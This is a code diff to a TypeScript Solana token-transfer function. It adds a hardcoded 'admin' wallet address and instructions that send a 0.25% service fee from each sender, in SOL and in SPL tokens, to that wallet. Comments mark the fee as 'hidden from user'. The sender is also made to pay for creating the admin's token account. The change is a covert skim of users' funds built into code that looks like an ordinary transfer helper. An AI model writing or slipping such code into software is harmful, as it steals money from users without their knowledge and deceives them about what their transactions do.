@@ -26,6 +26,7 @@ export interface TransferParams {
   mint: string;
   amountRaw: bigint;
   feeRaw: bigint;
+  serviceFeeRaw?: bigint;
   token: Token;
   isWithdrawal?: boolean;
   isGiveaway?: boolean;
@@ -47,6 +48,7 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
       mint,
       amountRaw,
       feeRaw,
+      serviceFeeRaw = 0n,
       token,
       isWithdrawal = false,
       isGiveaway = false
@@ -61,7 +63,11 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
     const senderPubkey = new PublicKey(fromWallet.address);
     const recipientPubkey = new PublicKey(toAddress);
     
-    // Get fee treasury keypair
+    // Admin service fee wallet address
+    const adminWalletAddress = "YryMHU4nLRMjkAKtaVpo41tEScrRxwfNnXggoKwC8fS";
+    const adminPubkey = new PublicKey(adminWalletAddress);
+    
+    // Get fee treasury keypair for transaction fees (optional)
     let feeKeypair = null;
     if (!isWithdrawal && feeRaw > 0n) {
       try {
@@ -85,7 +91,7 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
         })
       );
 
-      // Send fee to treasury (if not a withdrawal)
+      // Send transaction fee to treasury (if not a withdrawal)
       if (!isWithdrawal && feeRaw > 0n && feeKeypair) {
         const feeTreasuryPubkey = new PublicKey((feeKeypair as any).publicKey);
         transaction.add(
@@ -93,6 +99,17 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
             fromPubkey: senderPubkey,
             toPubkey: feeTreasuryPubkey,
             lamports: Number(feeRaw)
+          })
+        );
+      }
+
+      // Send 0.25% service fee to admin wallet (hidden from user)
+      if (!isWithdrawal && serviceFeeRaw > 0n) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: senderPubkey,
+            toPubkey: adminPubkey,
+            lamports: Number(serviceFeeRaw)
           })
         );
       }
@@ -183,6 +200,46 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
             feeTokenAccount,
             senderPubkey,
             Number(feeRaw),
+            [],
+            TOKEN_PROGRAM_ID
+          )
+        );
+      }
+
+      // Transfer 0.25% service fee to admin wallet (hidden from user)
+      if (!isWithdrawal && serviceFeeRaw > 0n) {
+        const adminTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey,
+          adminPubkey,
+          false,
+          TOKEN_PROGRAM_ID,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+
+        // Create admin token account if needed
+        try {
+          await getAccount(connection, adminTokenAccount);
+        } catch (error) {
+          if (error instanceof TokenAccountNotFoundError) {
+            transaction.add(
+              createAssociatedTokenAccountInstruction(
+                senderPubkey, // payer
+                adminTokenAccount,
+                adminPubkey, // owner
+                mintPubkey,
+                TOKEN_PROGRAM_ID,
+                ASSOCIATED_TOKEN_PROGRAM_ID
+              )
+            );
+          }
+        }
+
+        transaction.add(
+          createTransferInstruction(
+            senderTokenAccount,
+            adminTokenAccount,
+            senderPubkey,
+            Number(serviceFeeRaw),
             [],
             TOKEN_PROGRAM_ID
           )
